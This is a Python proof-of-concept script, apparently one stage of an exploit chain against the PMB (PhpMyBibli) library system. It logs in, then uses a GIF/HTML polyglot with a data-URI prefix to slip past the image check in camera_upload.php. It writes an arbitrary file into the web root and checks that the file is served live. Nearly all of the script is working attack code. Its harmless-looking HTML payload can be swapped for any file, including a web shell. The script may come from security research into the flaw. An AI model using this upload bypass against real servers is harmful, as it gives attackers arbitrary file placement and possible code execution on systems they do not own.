#!/usr/bin/env python3
"""Stage 5 — exercise the camera_upload.php upload primitive.

Shows the two gates (session, image check) and the data-URI bypass.

Usage:
  python 04_upload.py <user> <password> [filename]
"""
import sys

import common as c

sys.stdout.reconfigure(encoding="utf-8", errors="replace")


def main(argv):
    if len(argv) < 2:
        c.out("usage: python 04_upload.py <user> <password> [filename]")
        return 2
    user, password = argv[0], argv[1]
    filename = argv[2] if len(argv) > 2 else "upload_test.html"

    c.out("[*] login")
    cookies = c.login(user, password)
    if not cookies:
        c.out("[!] login failed")
        return 1
    c.out("    ok, SESSID %s" % cookies["PhpMyBibli-SESSID"])

    html = c.GIF_1X1 + b"\n<!DOCTYPE html><html><body><h1>upload proof</h1></body></html>"

    c.out("\n[*] gate 1 — raw base64 (no data URI)")
    status, body = c.upload(cookies, filename, html, as_image=False)
    c.out("    %s %s" % (status, body[:80]))

    c.out("\n[*] gate 2 — data-URI prefixed GIF polyglot")
    status, body = c.upload(cookies, filename, html, as_image=True)
    c.out("    %s %s" % (status, body[:80]))

    if b'"status":1' in body:
        path = "/pmb/" + filename
        c.out("\n[+] uploaded, verifying %s" % path)
        status, body = c.fetch(path)
        c.out("    GET %s -> %s (%d bytes)" % (path, status, len(body)))
        c.out("\n[+] live: %s%s" % (c.BASE, path))
        return 0
    c.out("\n[!] upload rejected")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
